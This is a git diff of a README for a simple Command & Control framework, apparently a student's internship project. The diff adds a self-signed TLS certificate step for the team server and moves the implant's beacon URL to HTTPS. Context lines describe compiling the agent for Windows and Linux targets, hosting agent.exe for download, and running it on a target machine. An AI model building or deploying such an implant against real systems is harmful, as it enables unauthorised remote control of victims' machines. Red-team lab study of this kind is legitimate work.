@@ -24,7 +24,25 @@ This C2 (Command & Control) framework consists of three components:
 
 ---
 
-## 1. Compile the Agent
+## 1. Generate TLS Certificate
+
+The team-server communicates over HTTPS. Since this is a dev/test infra, we use a self-signed certificate.
+
+```bash
+mkdir -p certs
+openssl req -x509 -newkey rsa:4096 -keyout certs/key.pem -out certs/cert.pem \
+  -days 365 -nodes \
+  -subj "/CN=TEAM_SERVER_IP" \
+  -addext "subjectAltName=IP:TEAM_SERVER_IP"
+```
+
+Replace `TEAM_SERVER_IP` with your server's actual IP (e.g. `10.10.10.10`).
+
+> The `certs/` directory is gitignored ^^.
+
+---
+
+## 2. Compile the Agent
 
 ### On Linux (Kali/Ubuntu) - For Windows Target
 
@@ -40,7 +58,7 @@ rustup target add x86_64-pc-windows-gnu
 #### Compile for Windows (from Linux)
 ```bash
 cd ~/Documents/implants/C2/agent
-BASE_URL=http://TEAM_SERVER_IP JITTER_MIN=3 JITTER_MAX=7 cargo build --target x86_64-pc-windows-gnu --release
+BASE_URL=https://TEAM_SERVER_IP JITTER_MIN=3 JITTER_MAX=7 cargo build --target x86_64-pc-windows-gnu --release
 ```
 
 The compiled binary will be at:
@@ -51,7 +69,7 @@ target/x86_64-pc-windows-gnu/release/agent.exe
 #### Compile for Linux (from Linux)
 ```bash
 cd ~/Documents/implants/C2/agent
-BASE_URL=http://TEAM_SERVER_IP JITTER_MIN=3 JITTER_MAX=7 cargo build --release
+BASE_URL=https://TEAM_SERVER_IP JITTER_MIN=3 JITTER_MAX=7 cargo build --release
 ```
 
 The compiled binary will be at:
@@ -66,7 +84,7 @@ target/release/agent
 
 ---
 
-## 2. Launch Docker Compose
+## 3. Launch Docker Compose
 
 ### On Your Linux Server
 
@@ -107,7 +125,7 @@ docker compose logs -f console
 
 ---
 
-## 3. Configuration & Adaptation
+## 4. Configuration & Adaptation
 
 ### Change Server IP/Port
 
@@ -117,13 +135,13 @@ If you need to change the C&C server address:
 #### Option 1: Recompile with New URL
 ```bash
 cd agent
-BASE_URL=http://10.10.10.11:8000 JITTER_MIN=3 JITTER_MAX=7 cargo build --target x86_64-pc-windows-gnu --release
+BASE_URL=https://10.10.10.11 JITTER_MIN=3 JITTER_MAX=7 cargo build --target x86_64-pc-windows-gnu --release
 ```
 
 #### Option 2: Use Environment Variable on Server
 Edit `.env.example` in `agent/` directory and create `.env`:
 ```
-BASE_URL=http://10.10.10.10:8000
+BASE_URL=https://10.10.10.10
 JITTER_MIN=3
 JITTER_MAX=7
 ```
@@ -177,7 +195,7 @@ docker compose up -d
 
 ---
 
-## 4. Host the Agent Binary
+## 5. Host the Agent Binary
 
 On your Linux server, host the compiled agent for download:
 
@@ -191,7 +209,7 @@ The agent will be available at: `http://10.10.10.10:8001/agent.exe`
 
 ---
 
-## 5. Download and Execute Agent on Windows
+## 6. Download and Execute Agent on Windows
 
 On a Windows target machine:
 
@@ -212,7 +230,7 @@ The agent will:
 
 ---
 
-## 6. Access the Console (Web UI)
+## 7. Access the Console (Web UI)
 
 Open your browser and navigate to:
 ```
@@ -228,4 +246,4 @@ Login with the password exposed in the api logs (`docker logs team-server`).
 
 Note : This implant is reallyyyyyyy simple and part of my personnal learning process (final year internship project). Enjoy ;)
 
-**Last Updated**: 2026-06-18
+**Last Updated**: 2026-06-30
